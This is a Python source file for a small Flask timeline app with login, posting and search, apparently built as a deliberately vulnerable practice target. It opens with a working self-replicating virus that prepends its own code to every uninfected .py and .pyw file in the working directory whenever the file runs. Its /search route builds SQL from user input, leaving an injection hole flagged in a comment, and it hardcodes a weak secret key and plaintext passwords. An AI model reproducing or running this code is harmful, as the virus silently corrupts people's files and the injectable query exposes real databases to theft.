# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!\n":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!

import os
import sqlite3
from flask import Flask, redirect, request, session, render_template_string
from jinja2 import Template


app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

# ===== EMBEDDED CSS =====
EMBEDDED_CSS = """
/* ===== Global Styles ===== */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  overflow-x: hidden;
}

/* ===== Navbar ===== */
.custom-navbar {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
  padding: 1rem 0;
}

.navbar-brand {
  font-weight: 700;
  font-size: 1.5rem;
  transition: transform 0.3s ease;
}

.navbar-brand:hover {
  transform: scale(1.05);
}

.logout-btn {
  transition: all 0.3s ease;
  border-radius: 8px;
  padding: 0.5rem 1rem !important;
}

.logout-btn:hover {
  background-color: rgba(255, 255, 255, 0.2);
  transform: translateY(-2px);
}

/* ===== Page Header ===== */
.page-title {
  font-size: 2.5rem;
  font-weight: 700;
  color: #fff;
  text-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

.subtitle {
  font-size: 1.1rem;
  color: rgba(255, 255, 255, 0.8);
}

/* ===== Glass Effect Cards ===== */
.glass-effect {
  background: rgba(255, 255, 255, 0.95);
  border: 1px solid rgba(255, 255, 255, 0.3);
  border-radius: 20px;
  backdrop-filter: blur(10px);
  box-shadow: 0 8px 32px rgba(31, 38, 135, 0.2);
  transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
  animation: slideUp 0.6s ease-out;
}

.glass-effect:hover {
  transform: translateY(-8px);
  box-shadow: 0 15px 40px rgba(102, 126, 234, 0.3);
}

@keyframes slideUp {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

/* ===== Entry Card ===== */
.entry-card .card-title {
  font-weight: 600;
  color: #667eea;
  font-size: 1.2rem;
}

.entry-input {
  border: 2px solid #e9ecef;
  border-radius: 12px;
  padding: 12px 16px;
  font-size: 1rem;
  transition: all 0.3s ease;
}

.entry-input:focus {
  border-color: #667eea;
  box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.15);
  outline: none;
}

.btn-post {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  border: none;
  border-radius: 12px;
  font-weight: 600;
  transition: all 0.3s ease;
  white-space: nowrap;
  padding: 12px 24px;
  color: white;
  cursor: pointer;
}

.btn-post:hover {
  transform: scale(1.05);
  box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
}

/* ===== Section Title ===== */
.section-title {
  font-size: 1.3rem;
  font-weight: 700;
  color: #fff;
  text-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
}

/* ===== Timeline Items ===== */
.timeline-item {
  border-left: 5px solid #667eea;
  transition: all 0.3s ease;
  margin-bottom: 20px;
}

.timeline-item:hover {
  border-left-color: #764ba2;
  box-shadow: 0 12px 35px rgba(102, 126, 234, 0.25);
}

.timeline-content {
  font-size: 1.05rem;
  color: #2d3748;
  line-height: 1.6;
  padding: 8px 0;
}

.quote-icon {
  color: #667eea;
  opacity: 0.5;
}

.btn-delete {
  background: #ff6b6b;
  border: none;
  border-radius: 10px;
  padding: 8px 12px;
  transition: all 0.3s ease;
  color: white;
  cursor: pointer;
}

.btn-delete:hover {
  background: #ff5252;
  transform: scale(1.1) rotate(5deg);
  box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
}

/* ===== Search Card ===== */
.search-card .card-title {
  font-weight: 600;
  color: #667eea;
  font-size: 1.2rem;
}

.search-group {
  box-shadow: 0 4px 15px rgba(102, 126, 234, 0.1);
  border-radius: 12px;
  overflow: hidden;
}

.search-input {
  border: none;
  border-radius: 12px 0 0 12px;
  padding: 12px 16px;
  font-size: 1rem;
  background: #f8f9fa;
  transition: all 0.3s ease;
}

.search-input:focus {
  background: #fff;
  box-shadow: none;
  outline: none;
}

.search-group .btn-primary {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  border: none;
  border-radius: 0 12px 12px 0;
  font-weight: 600;
  transition: all 0.3s ease;
  color: white;
  cursor: pointer;
}

.search-group .btn-primary:hover {
  transform: scale(1.02);
}

/* ===== Stats Card ===== */
.stat-icon {
  font-size: 3rem;
  color: #667eea;
  animation: bounce 2s infinite;
}

@keyframes bounce {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

/* ===== Alert ===== */
.alert {
  background: rgba(255, 255, 255, 0.95);
  border: 2px solid #667eea;
  border-radius: 15px;
  color: #667eea;
  font-weight: 500;
  padding: 20px;
  margin-top: 20px;
}

/* ===== Responsive Design ===== */
@media (max-width: 768px) {
  .page-title {
    font-size: 1.8rem;
  }

  .btn-post {
    padding: 10px 16px;
    white-space: nowrap;
    flex-shrink: 0;
  }

  .entry-input {
    font-size: 0.95rem;
  }

  .timeline-content {
    font-size: 1rem;
  }
}

/* ===== Login Page ===== */
.login-container {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}

.login-box {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 20px;
  padding: 50px 40px;
  box-shadow: 0 20px 60px rgba(31, 38, 135, 0.3);
  width: 100%;
  max-width: 400px;
  animation: slideUp 0.6s ease-out;
}

.login-title {
  text-align: center;
  color: #667eea;
  font-size: 2rem;
  font-weight: 700;
  margin-bottom: 10px;
}

.login-subtitle {
  text-align: center;
  color: #999;
  margin-bottom: 40px;
  font-size: 0.95rem;
}

.login-form input {
  width: 100%;
  padding: 12px 16px;
  margin-bottom: 15px;
  border: 2px solid #e9ecef;
  border-radius: 12px;
  font-size: 1rem;
  transition: all 0.3s ease;
}

.login-form input:focus {
  border-color: #667eea;
  box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.15);
  outline: none;
}

.login-form button {
  width: 100%;
  padding: 12px 16px;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  border-radius: 12px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
}

.login-form button:hover {
  transform: scale(1.02);
  box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
}
"""

# ===== EMBEDDED HTML TEMPLATE =====
TIMELINE_TEMPLATE = """<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Timeline App</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>{{ css }}</style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark custom-navbar">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">
                <i class="fas fa-timeline me-2"></i>TimelineApp
            </a>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <span class="navbar-text text-white">
                            <i class="fas fa-user me-1"></i>{{ user }}
                        </span>
                    </li>
                    <li class="nav-item ms-3">
                        <a class="nav-link logout-btn" href="/logout">
                            <i class="fas fa-sign-out-alt me-1"></i>Logout
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container py-5">
        <div class="row mb-5">
            <div class="col-lg-12">
                <h1 class="page-title mb-2">
                    <i class="fas fa-bookmark me-2"></i>My Timeline
                </h1>
                <p class="subtitle text-muted">Share your thoughts and moments</p>
            </div>
        </div>

        <div class="row g-4">
            <div class="col-lg-8">
                <div class="card glass-effect entry-card">
                    <div class="card-body p-4">
                        <h5 class="card-title mb-3">
                            <i class="fas fa-feather me-2"></i>Add New Entry
                        </h5>
                        <form action="/create" method="post" class="d-flex gap-2">
                            <input name="content" class="form-control entry-input" 
                                   placeholder="What's on your mind?" required>
                            <button type="submit" class="btn btn-primary btn-post">
                                <i class="fas fa-paper-plane me-1"></i>Post
                            </button>
                        </form>
                    </div>
                </div>

                <div class="timeline-container mt-4">
                    <h5 class="section-title mb-4">
                        <i class="fas fa-clock me-2"></i>Timeline Posts
                    </h5>
                    {% for line in tl %}
                    <div class="card glass-effect timeline-item">
                        <div class="card-body">
                            <div class="d-flex justify-content-between align-items-start">
                                <div class="flex-grow-1">
                                    <div class="timeline-content">
                                        <i class="fas fa-quote-left quote-icon me-2"></i>
                                        {{ line.content }}
                                    </div>
                                </div>
                                <a href="/delete/{{ line.id }}" class="btn btn-sm btn-delete">
                                    <i class="fas fa-trash-alt"></i>
                                </a>
                            </div>
                            <small class="text-muted d-block mt-2">
                                <i class="fas fa-clock me-1"></i>Posted
                            </small>
                        </div>
                    </div>
                    {% else %}
                    <div class="alert alert-info text-center" role="alert">
                        <i class="fas fa-inbox me-2"></i>No entries yet. Start sharing your thoughts!
                    </div>
                    {% endfor %}
                </div>
            </div>

            <div class="col-lg-4">
                <div class="card glass-effect search-card">
                    <div class="card-body p-4">
                        <h5 class="card-title mb-3">
                            <i class="fas fa-search me-2"></i>Search Posts
                        </h5>
                        <form action="/search" method="get">
                            <div class="input-group search-group">
                                <input name="keyword" class="form-control search-input" 
                                       placeholder="Search your posts..." autocomplete="off">
                                <button class="btn btn-primary" type="submit">
                                    <i class="fas fa-arrow-right"></i>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <div class="card glass-effect mt-4">
                    <div class="card-body p-4 text-center">
                        <div class="stat-icon mb-3">
                            <i class="fas fa-star"></i>
                        </div>
                        <h6 class="card-title">Welcome Back!</h6>
                        <p class="text-muted small">Keep sharing your amazing moments</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>"""

LOGIN_TEMPLATE = """<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login - Timeline App</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>{{ css }}</style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="login-title">
                <i class="fas fa-timeline me-2"></i>TimelineApp
            </div>
            <p class="login-subtitle">Welcome Back</p>
            <form method="post" class="login-form">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">
                    <i class="fas fa-sign-in-alt me-2"></i>Login
                </button>
            </form>
            <p style="text-align: center; margin-top: 20px; color: #999; font-size: 0.9rem;">
                <i class="fas fa-info-circle me-1"></i>Demo: alice/bobpw
            </p>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>"""

def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT    NOT NULL UNIQUE,
                password TEXT    NOT NULL
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS time_line(
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id  INTEGER NOT NULL,
                content  TEXT    NOT NULL,
                FOREIGN KEY(user_id) REFERENCES user(id)
            )
        ''')
        conn.commit()


def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany(
            'INSERT OR IGNORE INTO user(username, password) VALUES (?,?)',
            [('alice','alicepw'), ('bob','bobpw')]
        )
        cur.executemany(
            'INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)',
            [(1,'Hello world'), (2,'Hi there')]
        )
        conn.commit()


def authenticate(username, password):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'SELECT id, username FROM user WHERE username = ? AND password = ?',
            (username, password)
        )
        row = cur.fetchone()
        return dict(row) if row else None



def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO time_line(user_id, content) VALUES (?,?)',
            (uid, content)
        )
        conn.commit()


def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]


def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
        "DELETE FROM time_line WHERE user_id = ? AND id = ?",
        (uid, tid)
    )
    conn.commit()


@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    conn = connect_db()
    cur = conn.cursor()
    # 🔥 VULNERABILITY: SQL Injection di sini!
    query = f"SELECT id, user_id, content FROM time_line WHERE content LIKE '%{keyword}%'"
    cur.execute(query)
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return {
        'query_used': query,
        'results': rows
    }

@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

@app.route('/')
def index():
    if 'uid' in session:
        tl = get_time_lines()
        return render_template_string(TIMELINE_TEMPLATE, user=session['username'], tl=tl, css=EMBEDDED_CSS)
    return redirect('/login')


@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            session['uid'] = user['id']
            session['username'] = user['username']
            return redirect('/')
    return render_template_string(LOGIN_TEMPLATE, css=EMBEDDED_CSS)

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        create_time_line(session['uid'], request.form['content'])
    return redirect('/')

@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        delete_time_line(session['uid'], tid)
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')


if __name__=='__main__':
    app.run(debug=True)